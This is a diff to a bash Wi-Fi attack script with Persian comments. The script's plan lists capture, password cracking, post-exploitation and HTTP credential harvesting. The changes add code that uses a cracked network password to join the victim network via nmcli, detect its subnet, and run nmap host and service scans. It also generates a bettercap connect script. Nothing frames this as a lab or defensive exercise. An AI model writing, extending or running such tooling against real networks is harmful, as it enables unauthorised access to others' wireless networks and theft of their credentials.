@@ -147,7 +147,7 @@ mkdir -p "$REPORT"
     macchanger -r $MON  (stealth only)
 
 [0.5] Passive recon (if kismet installed)
-    timeout 30 kismet -c $MON --daemonize
+    timeout 30 kismet -c $MON
 
 PLAN
   echo "[1] Capture (${CAPTURE:-120}s)"
@@ -185,8 +185,8 @@ PLAN
     sleep 180
 
 [6] Post-exploit (if cracks found and DO_POST)
-    nmap -sn 192.168.1.0/24
-    nmap -sV -p 22,80,443,445,3389,8080 192.168.1.0/24
+    nmap -sn $SUBNET   (auto-detected or 192.168.1.0/24)
+    nmap -sV -p 22,80,443,445,3389,8080 $SUBNET
     generate $REPORT/connect.sh (nmcli + bettercap)
 
 [6.5] HTTP credential harvesting (if cracked and DO_HARVEST)
@@ -272,9 +272,7 @@ fi
 # ---------- فاز ۰.۵: شناسایی منفعل (kismet) ----------
 if [ "$SKIP_TO" -le 1 ] && command -v kismet >/dev/null; then
   hr; c "فاز ۰.۵ — شناسایی منفعل با kismet"
-  timeout 30 kismet -c "$MON" --daemonize 2>/dev/null || true
-  sleep 10
-  pkill -f kismet 2>/dev/null || true
+  timeout 30 kismet -c "$MON" >/dev/null 2>&1 || true
   ok "شناسایی منفعل کامل شد."
   save_checkpoint 1
 fi
@@ -554,11 +552,27 @@ if [ "$SKIP_TO" -le 7 ] && [ "$DO_POST" -eq 1 ] && [ -s "$WORK/cracked.txt" ]; t
   hr; c "فاز ۶ — آماده‌سازی post-exploit"
   first=$(head -1 "$WORK/cracked.txt")
   b=$(cut -d'|' -f1 <<<"$first"); p=$(cut -d'|' -f2 <<<"$first")
+  # تشخیص subnet واقعی شبکهٔ کرک‌شده (best-effort)
+  SUBNET="192.168.1.0/24"
+  if [ -n "${IFACE2:-}" ] && command -v nmcli >/dev/null; then
+    c "  → اتصال به شبکه برای تشخیص subnet (via $IFACE2)"
+    if nmcli dev wifi connect "$b" password "$p" ifname "$IFACE2" >/dev/null 2>&1; then
+      sleep 5
+      det=$(ip -4 route 2>/dev/null | awk -v dev="$IFACE2" '$0 ~ dev && /proto kernel/ {print $1; exit}')
+      [ -n "$det" ] && SUBNET="$det"
+      ok "subnet تشخیص داده شد: $SUBNET"
+      nmcli dev disconnect "$IFACE2" >/dev/null 2>&1 || true
+    else
+      warn "اتصال برای تشخیص subnet ناموفق؛ پیش‌فرض $SUBNET"
+    fi
+  else
+    warn "IFACE2/nmcli نیست؛ nmap روی پیش‌فرض $SUBNET اجرا می‌شود."
+  fi
   # nmap: اسکن شبکهٔ کرک‌شده برای شناسایی سرویس‌ها
   if command -v nmap >/dev/null; then
-    c "  → nmap اسکن شبکه"
-    nmap -sn 192.168.1.0/24 -oN "$REPORT/nmap-hosts.txt" 2>/dev/null || true
-    nmap -sV -p 22,80,443,445,3389,8080 192.168.1.0/24 -oN "$REPORT/nmap-services.txt" 2>/dev/null || true
+    c "  → nmap اسکن شبکه ($SUBNET)"
+    nmap -sn "$SUBNET" -oN "$REPORT/nmap-hosts.txt" 2>/dev/null || true
+    nmap -sV -p 22,80,443,445,3389,8080 "$SUBNET" -oN "$REPORT/nmap-services.txt" 2>/dev/null || true
     ok "نتایج nmap: $REPORT/nmap-hosts.txt"
   fi
   cat > "$REPORT/connect.sh" <<EOF
